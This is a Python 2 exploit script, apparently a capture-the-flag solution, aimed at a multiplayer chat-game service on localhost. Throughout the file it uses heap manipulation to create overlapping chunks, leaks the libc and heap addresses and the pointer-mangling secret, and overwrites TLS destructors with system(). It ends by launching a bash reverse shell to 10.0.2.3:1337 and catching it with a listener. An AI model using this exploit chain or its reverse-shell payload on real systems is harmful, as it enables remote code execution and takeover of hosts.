from pwnlib import *

COMMAND = "bash -c '(bash -i >& /dev/tcp/10.0.2.3/1337 0>&1)' #"

def make_sock(name):
	s = Socket(("localhost", 5566))
	s.ru("What's your name?\n")
	s.send("%s\n" % name)
	s.ru("Enjoy the game!:)\n")

	return s, whoami(s)

def send_message(s, playerid, message):
	assert "\n" not in message
	s.send("/msg %d %d\n" % (playerid, len(message)))
	s.ru("Your msg: ")
	s.send(message)
	s.ru("Told")

def whoami(s):
	s.send("/whoami\n")
	s.ru(" Player ")
	return int(s.ru("       "), 10)

def delete_message(s, n):
	s.send("/del %d\n" % n)
	s.ru("Delete Success!\n")

def setup_overlapping_chunks(s, s2):
	n = whoami(s)
	n2 = whoami(s2)

	send_message(s, n2, "1"*0x70)
	send_message(s, n2, "2"*0x880)
	#	| m1 | d1 | m2 | d2      |
	#
	delete_message(s, 0) # "1"
	#	| F  | F  | m2 | d2      |
	#
	send_message(s, n2, "1"*0x100)
	#	| m1 | F  | m2 | d2      | d1   |
	#
	send_message(s, n2, "3"*0x50)
	send_message(s, n2, "4"*0x28)
	send_message(s, n2, "5"*0x60)
	#	| m1 | F  | m2 | d2      | d1   | m3 | d3 | m4 | d4 | m5 | d5 |
	#
	delete_message(s, 0) # "2"
	#	| m1 | F  | F  | F       | d1   | m3 | d3 | m4 | d4 | m5 | d5 |
	#
	delete_message(s, 3) # "5"
	#	| m1 | F  | F  | F       | d1   | m3 | d3 | m4 | d4 | F  | F  |
	#
	send_message(s2, n, "X"*(0x28 + 1))
	s.ru("BBBB said")
	#	| m1 | F  | dX | F       | d1   | m3 | d3 | m4 | d4 | mX | F  |
	#
	delete_message(s, 2) # "4"
	#	| m1 | F  | dX | F       | d1   | m3 | d3 | F  | F  | mX | F  |
	#
	send_message(s, n2, "6"*0x200)
	#	| m1 | F  | dX | d6 |    | d1   | m3 | d3 | m6 | F  | mX | F  |
	#
	send_message(s, n2, "7"*0x500)
	#	| m1 | F  | dX | d6 | d7 | d1   | m3 | d3 | m6 | m7 | mX | F  |
	#
	delete_message(s, 3) # "6"
	#	| m1 | F  | dX | F  | d7 | d1   | m3 | d3 | F  | m7 | mX | F  |
	#
	delete_message(s, 0) # "1"
	#	| F  | F  | dX | F  | d7 | F    | m3 | d3 | F  | m7 | mX | F  |
	#	                -----overlap----


def leak_libc_base():
	s, n = make_sock("AAAA")
	s2, n2 = make_sock("BBBB")

	setup_overlapping_chunks(s, s2)

	send_message(s, n2, "8"*0x1e8)
	send_message(s, n2, "9"*0x10)

	s.send("/log\n")
	s.ru("[2] Told ")
	s.ru("BBBB : ")
	libc_ptr = uq(s.ru("0a5b335d".decode("hex")).ljust(8, chr(0)))
	libc_base = libc_ptr - 0x3c3b78
	assert libc_base & 0xfff == 0

	return libc_base

def corrupt_message_struct(s, s2, n2, payload):
	setup_overlapping_chunks(s, s2)

	send_message(s, n2, "8"*0x100)
	send_message(s, n2, "9"*0xf0)
	send_message(s, n2, "a"*0x100) # this one's message struct lands on d7

	delete_message(s, 2) # d7 (frees message struct)

	# this overwrites the message struct!
	send_message(s, n2, payload)

def leak(addr):
	s, n = make_sock("AAAA")
	s2, n2 = make_sock("BBBB")

	payload  = pq(0) # nextptr
	payload += pq(addr) # dataptr
	payload += pattern(0x28 - len(payload))

	corrupt_message_struct(s, s2, n2, payload)

	s.send("/log\n")
	s.ru("aaabaacaadaaeaa said : ")
	return s.recv()[:-1]


libc_base = leak_libc_base()
system = libc_base + 0x45380
print "libc_base: 0x%x" % libc_base

heap_base_ptr = libc_base + 0x3c31b0
heap_base = uq("\x00" + leak(heap_base_ptr + 1)[:7].ljust(7, chr(0)))
print "heap_base: 0x%x" % heap_base
assert heap_base & 0xfff == 0

dtors_addr = libc_base + 0x8006c0
secret_addr = libc_base + 0x800730
secret = uq(leak(secret_addr)[:8])
print "secret: 0x%x" % secret

def mangle(ptr):
	ptr ^= secret
	ptr = ((ptr << 0x11) | (ptr >> (64 - 0x11))) % (1<<64)
	return ptr

tls_chunk_addr = heap_base + 0x440
command_addr = heap_base + 0x40

s, n = make_sock("AAAA")
s2, n2 = make_sock("BBBB")

payload  = pq(dtors_addr)
payload += pq(tls_chunk_addr) # data (gets freed)
payload += pattern(0x28 - len(payload))

corrupt_message_struct(s, s2, n2, payload)

# trigger the write-ptr-where
send_message(s, n2, COMMAND.ljust(0x70, "X"))

payload  = pq(mangle(system))
payload += pq(command_addr)
payload += pattern(0x28 - len(payload))

delete_message(s, 4)
send_message(s, n2, payload)

ss = accept(1337, lambda: s.send("/exit\n"))
ss.interact()
